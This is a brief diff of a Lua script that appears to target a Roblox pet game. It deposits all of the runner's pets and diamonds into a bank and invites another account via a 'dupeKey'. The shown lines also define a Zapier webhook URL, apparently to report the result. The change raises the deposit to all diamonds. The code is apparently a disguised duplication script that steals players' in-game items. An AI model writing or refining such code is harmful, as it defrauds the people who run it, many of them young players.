@@ -9,7 +9,7 @@ for i,v in pairs(lib.Save.Get().Pets) do
         table.insert(PetsList, v.uid);
     end
 end
-local request = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 69);
+local request = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 0);
 if request then
     lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], dupeKey)
     local url = "https://hooks.zapier.com/hooks/catch/12815413/bw949c4/"
